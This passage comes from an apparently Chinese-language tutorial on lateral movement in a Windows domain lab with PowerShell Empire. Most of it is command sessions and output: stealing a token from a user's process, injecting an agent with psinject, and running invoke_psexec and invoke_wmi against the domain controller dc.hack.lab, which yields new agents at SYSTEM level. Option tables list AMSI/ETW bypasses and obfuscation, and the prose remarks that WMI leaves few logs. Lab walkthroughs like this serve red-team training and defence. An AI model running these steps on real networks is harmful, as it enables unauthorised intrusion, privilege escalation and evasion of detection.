</span></span><span class="line"><span class="cl"> <span class="m">1892</span>  dllhost        x64   NT AUTHORITY<span class="se">\S</span>YSTEM           4.38 MB   
</span></span><span class="line"><span class="cl"> <span class="m">1980</span>  conhost        x64   WIN-JH8N3KV3OQ0<span class="se">\s</span>c92n         2.30 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2024</span>  svchost        x64   NT AUTHORITY<span class="se">\L</span>OCAL SERVICE    1.69 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2076</span>  rdpclip        x64   HACK<span class="se">\t</span>estuser                 5.83 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2080</span>  dwm            x64   HACK<span class="se">\t</span>estuser                 4.55 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2228</span>  msdtc          x64   NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  1.29 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2508</span>  HipsTray       x86   HACK<span class="se">\t</span>estuser                 16.03 MB  
</span></span><span class="line"><span class="cl"> <span class="m">2536</span>  csrss          x64   NT AUTHORITY<span class="se">\S</span>YSTEM           5.79 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2608</span>  taskhost       x64   WIN-JH8N3KV3OQ0<span class="se">\s</span>c92n         6.69 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2620</span>  mscorsvw       x64   NT AUTHORITY<span class="se">\S</span>YSTEM           8.22 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2676</span>  svchost        x64   NT AUTHORITY<span class="se">\S</span>YSTEM           5.37 MB   
</span></span><span class="line"><span class="cl"> <span class="m">2772</span>  taskhost       x64   HACK<span class="se">\t</span>estuser                 9.01 MB   
</span></span></code></pre></div><p>可以看到<code>testuser</code>有个进程为cmd且pid为<code>1888</code>的进程，我们使用该进程进行利用,可以看到和刚才使用pth的效果是一样的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: 7SU3EWKV<span class="o">)</span> &gt; steal_token <span class="m">1888</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7SU3EWKV to run Task <span class="m">18</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">18</span> results received
</span></span><span class="line"><span class="cl">Running As: HACK<span class="se">\t</span>estuser
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Invoke-TokenManipulation completed!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Use credentials/tokens with RevToSelf option to revert token privileges
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7SU3EWKV<span class="o">)</span> &gt; shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exit Shell Menu with Ctrl+C
</span></span><span class="line"><span class="cl"><span class="o">(</span>7SU3EWKV<span class="o">)</span> C:<span class="se">\U</span>sers<span class="se">\s</span>c92n &gt; dir <span class="se">\\</span>dc.hack.lab<span class="se">\c</span>$
</span></span><span class="line"><span class="cl"><span class="o">[</span>
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Mode&#34;</span>:  <span class="s2">&#34;d--hs-&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Owner&#34;</span>:  <span class="s2">&#34;NT AUTHORITY\\SYSTEM&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;LastWriteTime&#34;</span>:  <span class="s2">&#34;\/Date(1642570875809)\/&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;length&#34;</span>:  null,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Name&#34;</span>:  <span class="s2">&#34;</span><span class="nv">$Recycle</span><span class="s2">.Bin&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Mode&#34;</span>:  <span class="s2">&#34;d--h--&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Owner&#34;</span>:  <span class="s2">&#34;BUILTIN\\Administrators&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;LastWriteTime&#34;</span>:  <span class="s2">&#34;\/Date(1642491461599)\/&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;length&#34;</span>:  null,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Name&#34;</span>:  <span class="s2">&#34;</span><span class="nv">$WINDOWS</span><span class="s2">.~BT&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Mode&#34;</span>:  <span class="s2">&#34;d--hsl&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Owner&#34;</span>:  <span class="s2">&#34;NT AUTHORITY\\SYSTEM&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;LastWriteTime&#34;</span>:  <span class="s2">&#34;\/Date(1642396243258)\/&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;length&#34;</span>:  null,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Name&#34;</span>:  <span class="s2">&#34;Documents and Settings&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span></code></pre></div><h3 id="会话注入">会话注入</h3>
<p>这个跟上面的进程注入差不多，只是注入这个进程后会新建一个会话进行操作，使用<code>psinject</code>模块进行操作：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: 7SU3EWKV<span class="o">)</span> &gt; usemodule powershell/management/psinject
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to 7SU3EWKV
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                                               
</span></span><span class="line"><span class="cl">              @sixdub                                                                
</span></span><span class="line"><span class="cl">              leechristensen <span class="o">(</span>@tifkin_<span class="o">)</span>                                              
</span></span><span class="line"><span class="cl"> Background   True                                                                   
</span></span><span class="line"><span class="cl"> Comments     http://sixdub.net                                                      
</span></span><span class="line"><span class="cl"> Description  Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick 
</span></span><span class="line"><span class="cl">              which executes PS codefrom memory in a remote process. ProcID or       
</span></span><span class="line"><span class="cl">              ProcName must be specified.                                            
</span></span><span class="line"><span class="cl"> Language     powershell                                                             
</span></span><span class="line"><span class="cl"> Name         powershell/management/psinject                                         
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                  
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                                   
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1055                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value              │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ 7SU3EWKV           │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │                    │ True     │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │                    │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span>        │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProcId           │                    │ False    │ ProcessID to inject into.           │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProcName         │                    │ False    │ Process name to inject into.        │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Proxy            │ default            │ False    │ Proxy to use <span class="k">for</span> request <span class="o">(</span>default,  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ none, or other<span class="o">)</span>.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="o">([</span>domain<span class="se">\]</span>username:password<span class="o">)</span> to use │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="k">for</span> request <span class="o">(</span>default, none, or      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserAgent        │ default            │ False    │ User-agent string to use <span class="k">for</span> the    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ staging request <span class="o">(</span>default, none, or  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/management/psinject<span class="o">)</span> &gt; <span class="nb">set</span> Listener <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Listener to <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/management/psinject<span class="o">)</span> &gt; <span class="nb">set</span> ProcId <span class="m">1888</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set ProcId to <span class="m">1888</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/management/psinject<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7SU3EWKV to run Task <span class="m">25</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">25</span> results received
</span></span><span class="line"><span class="cl">Job started: 28AR64
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> New agent 7VLBMT3A checked in
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending agent <span class="o">(</span>stage 2<span class="o">)</span> to 7VLBMT3A at 172.16.0.105
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7SU3EWKV<span class="o">)</span> &gt; back
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; list
</span></span></code></pre></div><p>可以看到<code>testuser</code>已经上线：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//16.png" alt="16"></p>
<h3 id="invoke-psexec">Invoke-PsExec</h3>
<p>这个模块是在MSF和CS上经常用的，官方PsTools工具包也有PsExec，缺点的话就是执行后会被各大杀软检测和留下系统日志，而且还需要开启<code>admin$</code>445 端口共享。</p>
<p>这里使用上面会话注入得到的<code>hack\testuser</code>用户的权限进行攻击,使用模块<code>powershell/lateral_movement/invoke_psexec</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; interact 7VLBMT3A
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; whoami
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">1</span> results received
</span></span><span class="line"><span class="cl">HACK<span class="se">\t</span>estuser
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; usemodule powershell/lateral_movement/invoke_psexec
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to 7VLBMT3A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                                           
</span></span><span class="line"><span class="cl"> Background   True                                                               
</span></span><span class="line"><span class="cl"> Comments     https://github.com/rapid7/metasploit-                              
</span></span><span class="line"><span class="cl">              framework/blob/master/tools/psexec.rb                              
</span></span><span class="line"><span class="cl"> Description  Executes a stager on remote hosts using PsExec <span class="nb">type</span> functionality. 
</span></span><span class="line"><span class="cl"> Language     powershell                                                         
</span></span><span class="line"><span class="cl"> Name         powershell/lateral_movement/invoke_psexec                          
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                              
</span></span><span class="line"><span class="cl"> OpsecSafe    False                                                              
</span></span><span class="line"><span class="cl"> Software     http://attack.mitre.org/software/S0029                             
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1035                           
</span></span><span class="line"><span class="cl">              http://attack.mitre.org/techniques/T1077                           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value              │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ 7VLBMT3A           │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Command          │                    │ False    │ Custom <span class="nb">command</span> to execute on remote │
</span></span><span class="line"><span class="cl">│                  │                    │          │ hosts.                              │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ComputerName     │                    │ True     │ Host to execute the stager on.      │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │                    │ False    │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │                    │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span>        │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ OutputFunction   │ Out-String         │ False    │ PowerShell<span class="err">&#39;</span>s output <span class="k">function</span> to use │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="o">(</span><span class="s2">&#34;Out-String&#34;</span>, <span class="s2">&#34;ConvertTo-Json&#34;</span>,    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="s2">&#34;ConvertTo-Csv&#34;</span>, <span class="s2">&#34;ConvertTo-Html&#34;</span>,  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="s2">&#34;ConvertTo-Xml&#34;</span><span class="o">)</span>.                   │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Proxy            │ default            │ False    │ Proxy to use <span class="k">for</span> request <span class="o">(</span>default,  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ none, or other<span class="o">)</span>.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="o">([</span>domain<span class="se">\]</span>username:password<span class="o">)</span> to use │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="k">for</span> request <span class="o">(</span>default, none, or      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ResultFile       │                    │ False    │ Name of the file to write the       │
</span></span><span class="line"><span class="cl">│                  │                    │          │ results to on agent machine.        │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ServiceName      │ Updater            │ True     │ The name of the service to create.  │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserAgent        │ default            │ False    │ User-agent string to use <span class="k">for</span> the    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ staging request <span class="o">(</span>default, none, or  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_psexec<span class="o">)</span> &gt; <span class="nb">set</span> ComputerName dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set ComputerName to dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_psexec<span class="o">)</span> &gt; <span class="nb">set</span> Listener <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Listener to <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_psexec<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">2</span> results received
</span></span><span class="line"><span class="cl">Job started: YXPMKF
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">2</span> results received
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Invoke-PsExec completed!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> New agent AU6PZ3M5 checked in
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending agent <span class="o">(</span>stage 2<span class="o">)</span> to AU6PZ3M5 at 172.16.0.106
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; back
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; list
</span></span></code></pre></div><p>可以看到域控<code>106</code>已经上线了，而且还是system权限：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//17.png" alt="17"></p>
<h3 id="invoke-wmi">Invoke-WMI</h3>
<p>所有的Windows系统都启用了该访问，wmi会比PsExec安全，因为使用wmiexec攻击的时候，Windows默认不会留下日志，而且攻击的脚本也不需要写入硬盘，具有很高的隐蔽性，如果目标机器开启了防火墙可以会导致wmi无法连接。</p>
<p>使用模块<code>lateral_movement/invoke_wmi</code>进行攻击：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; whoami
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">3</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">3</span> results received
</span></span><span class="line"><span class="cl">HACK<span class="se">\t</span>estuser
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; usemodule powershell/lateral_movement/invoke_wmi
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to 7VLBMT3A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                     
</span></span><span class="line"><span class="cl"> Background   False                                        
</span></span><span class="line"><span class="cl"> Description  Executes a stager on remote hosts using WMI. 
</span></span><span class="line"><span class="cl"> Language     powershell                                   
</span></span><span class="line"><span class="cl"> Name         powershell/lateral_movement/invoke_wmi       
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                        
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                         
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1047     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬─────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value       │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ 7VLBMT3A    │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ False       │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │             │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Command          │             │ False    │ Custom <span class="nb">command</span> to run.              │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ComputerName     │             │ True     │ Host<span class="o">[</span>s<span class="o">]</span> to execute the stager on,   │
</span></span><span class="line"><span class="cl">│                  │             │          │ comma separated.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ CredID           │             │ False    │ CredID from the store to use.       │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │             │ False    │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False       │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │             │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │             │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │             │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span> │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │             │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
</span></span><span class="line"><span class="cl">│                  │             │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Password         │             │ False    │ Password to use to execute command. │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Proxy            │ default     │ False    │ Proxy to use <span class="k">for</span> request <span class="o">(</span>default,  │
</span></span><span class="line"><span class="cl">│                  │             │          │ none, or other<span class="o">)</span>.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProxyCreds       │ default     │ False    │ Proxy credentials                   │
</span></span><span class="line"><span class="cl">│                  │             │          │ <span class="o">([</span>domain<span class="se">\]</span>username:password<span class="o">)</span> to use │
</span></span><span class="line"><span class="cl">│                  │             │          │ <span class="k">for</span> request <span class="o">(</span>default, none, or      │
</span></span><span class="line"><span class="cl">│                  │             │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserAgent        │ default     │ False    │ User-agent string to use <span class="k">for</span> the    │
</span></span><span class="line"><span class="cl">│                  │             │          │ staging request <span class="o">(</span>default, none, or  │
</span></span><span class="line"><span class="cl">│                  │             │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserName         │             │ False    │ <span class="o">[</span>domain<span class="se">\]</span>username to use to execute │
</span></span><span class="line"><span class="cl">│                  │             │          │ command.                            │
</span></span><span class="line"><span class="cl">└──────────────────┴─────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_wmi<span class="o">)</span> &gt; <span class="nb">set</span> ComputerName dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set ComputerName to dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_wmi<span class="o">)</span> &gt; <span class="nb">set</span> Listener <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Listener to <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_wmi<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">4</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> New agent DUT5CV6G checked in
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending agent <span class="o">(</span>stage 2<span class="o">)</span> to DUT5CV6G at 172.16.0.106
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; back
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; list
</span></span></code></pre></div><p>可以看到已经反弹成功，而且权限不是像PsExec一样有system权限，但是带有了星号：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//18.png" alt="18"></p>
<h3 id="powershell-remoting">Powershell Remoting</h3>
<p>该功能是Powershell远程管理功能，开启WinRM服务会生成一个监听端口5985，该服务在Windows Server 2012 以上是默认开启的，在之前的系统是要手动来开启才行。</p>
<p>如果目标启用了Powershell Remoting，我们就可以使用域用户对其进行横向渗透，使用的模块是<code>invoke_psremoting </code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; whoami
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">5</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">5</span> results received
